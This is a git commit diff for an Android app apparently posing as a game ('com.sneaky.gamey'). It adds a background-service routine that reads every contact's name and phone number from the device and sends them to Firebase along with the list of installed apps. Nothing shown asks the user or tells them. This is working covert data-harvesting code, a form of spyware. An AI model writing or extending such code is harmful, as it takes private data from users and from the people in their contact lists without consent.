c095ed33ef72f32ccad9142769dab94c4cac7eda
nightowlish <oanaolf@gmail.com>
2020-10-31 23:02:55 +0200

    contact list

--- app/src/main/java/com/sneaky/gamey/services/MainService.java
+++ app/src/main/java/com/sneaky/gamey/services/MainService.java
@@ -1,10 +1,13 @@
 package com.sneaky.gamey.services;
 
 import android.app.Service;
+import android.content.ContentResolver;
 import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.os.IBinder;
+import android.provider.ContactsContract;
 
 import androidx.annotation.Nullable;
 
@@ -17,8 +20,11 @@ public class MainService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        ArrayList<String> installedApps = getInstalledApplications();
-        Firebase.sendData(installedApps);
+        ArrayList<String> data = getInstalledApplications();
+        Firebase.sendData(data);
+        data = getContactList();
+        Firebase.sendData(data);
+
         return super.onStartCommand(intent, flags, startId);
     }
 
@@ -36,5 +42,29 @@ public class MainService extends Service {
             packageNames.add(packageInfo.packageName);
         }
         return packageNames;
+    }
+    private ArrayList<String> getContactList() {
+        ContentResolver cr = getContentResolver();
+        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null);
+        ArrayList<String> contacts = new ArrayList<String>();
+
+        if ((cur != null ? cur.getCount() : 0) > 0) {
+            while (cur != null && cur.moveToNext()) {
+                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
+                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
+                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
+                    while (pCur.moveToNext()) {
+                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                        contacts.add("name: " + name + " number: " + phoneNo);
+                    }
+                    pCur.close();
+                }
+            }
+        }
+        if(cur != null){
+            cur.close();
+        }
+        return contacts;
     }
 }
